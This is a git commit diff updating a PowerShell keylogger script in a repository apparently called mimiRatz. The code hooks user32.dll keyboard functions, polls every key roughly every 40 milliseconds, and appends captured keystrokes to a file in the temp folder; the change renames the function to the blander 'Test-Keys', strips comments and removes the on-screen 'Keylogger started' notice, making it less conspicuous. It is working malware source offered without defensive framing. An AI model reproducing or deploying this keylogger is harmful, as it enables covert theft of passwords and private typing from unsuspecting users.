d653a023cd4dc603351301362c2962aa26ecb57b
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2020-06-12 05:23:01 +0100

    Update keylooger.ps1

--- mimiRatz/keylooger.ps1
+++ mimiRatz/keylooger.ps1
@@ -1,7 +1,6 @@
-﻿function Test-KeyLogger($logPath="$env:temp\KBlogger.txt") 
-{
-  # API declaration
-  $APIsignatures = @'
+﻿function Test-Keys($logPath="$env:temp\KBlogger.txt"){
+# API declaration
+$APIsignatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -18,27 +17,18 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   try
   {
-    Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
-
     while ($true) {
       Start-Sleep -Milliseconds 40            
       for ($ascii = 9; $ascii -le 254; $ascii++) {
-        # get key state
         $keystate = $API::GetAsyncKeyState($ascii)
-        # if key pressed
         if ($keystate -eq -32767) {
           $null = [console]::CapsLock
-          # translate code
           $virtualKey = $API::MapVirtualKey($ascii, 3)
-          # get keyboard state and create stringbuilder
           $kbstate = New-Object Byte[] 256
           $checkkbstate = $API::GetKeyboardState($kbstate)
-          $loggedchar = New-Object -TypeName System.Text.StringBuilder
-
-          # translate virtual key          
+          $loggedchar = New-Object -TypeName System.Text.StringBuilder     
           if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
           {
-            #if success, add key to logger file
             [System.IO.File]::AppendAllText($logPath, $loggedchar, [System.Text.Encoding]::Unicode)
           }
         }
@@ -50,5 +40,4 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     notepad $logPath
   }
 }
-
-Test-KeyLogger
+Test-Keys
